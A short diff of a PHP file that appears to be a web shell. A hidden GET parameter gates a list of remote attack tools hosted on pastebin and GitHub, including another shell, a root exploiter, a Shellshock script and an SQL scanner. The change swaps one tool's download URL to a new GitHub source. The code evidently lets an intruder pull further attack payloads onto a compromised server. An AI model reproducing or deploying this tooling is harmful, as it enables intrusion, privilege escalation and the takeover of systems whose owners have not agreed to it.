@@ -493,7 +493,7 @@ if (isset($_GET['make_love'])) {
         "noname" => "https://pastebin.com/raw/NXidmXn5",
         "blackhat" => "https://raw.githubusercontent.com/SurabayaBlackhat/sbh-shell/master/Shell-v.2.5.php",
         "sqlscan" => "https://pastebin.com/raw/3jwmYBzc",
-        "iptrack" => "https://pastebin.com/raw/tGEFiPYm",
+        "iptrack" => "https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/iptrack.txt",
         "lokmed" => "https://pastebin.com/raw/0STXanAx",
         "rootex" => "https://raw.githubusercontent.com/mukarramkhalid/root-exploiter-php-cpp/master/root-c.php",
         "shellshock" => "https://pastebin.com/raw/ZB3DLXwR"
